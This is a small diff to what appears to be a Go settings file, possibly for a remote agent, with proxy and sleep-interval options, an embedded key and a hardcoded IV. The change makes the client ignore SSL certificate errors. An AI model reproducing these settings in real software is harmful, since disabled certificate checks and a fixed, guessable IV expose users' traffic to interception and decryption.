@@ -23,7 +23,7 @@ J6JqDBl5e3S7KOhvci76QtWfR/TrNyU9tv8Wz8wqe9kovpHNpVzUNJvVUQIDAQAB
 	UseProxy                    = false
 	Proxy                       = "127.0.0.1:8080"
 	SleepTime                   = 10000 * time.Millisecond
-	VerifySSLCert               = true
+	IgnoreSSLCertErrors         = true
 	TimeOut       time.Duration = 10 //seconds
 
 	IV        = []byte("abcdefghijklmnop")
